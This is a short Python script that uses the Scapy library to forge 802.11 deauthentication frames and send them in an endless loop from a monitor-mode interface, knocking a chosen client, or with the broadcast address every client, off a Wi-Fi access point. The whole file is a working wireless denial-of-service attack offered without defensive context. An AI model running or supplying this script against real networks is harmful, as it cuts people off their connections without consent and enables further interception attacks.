from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


def deauthenticate(victimMAC, APMAC): #use FF:FF:FF:FF:FF:FF for victim to disconnect all clients from AP?
    pkt = RadioTap() / Dot11(addr1=victimMAC, addr2=APMAC, addr3=APMAC) / Dot11Deauth()
    while (True):
        sendp(pkt, iface="wlp3s0mon")

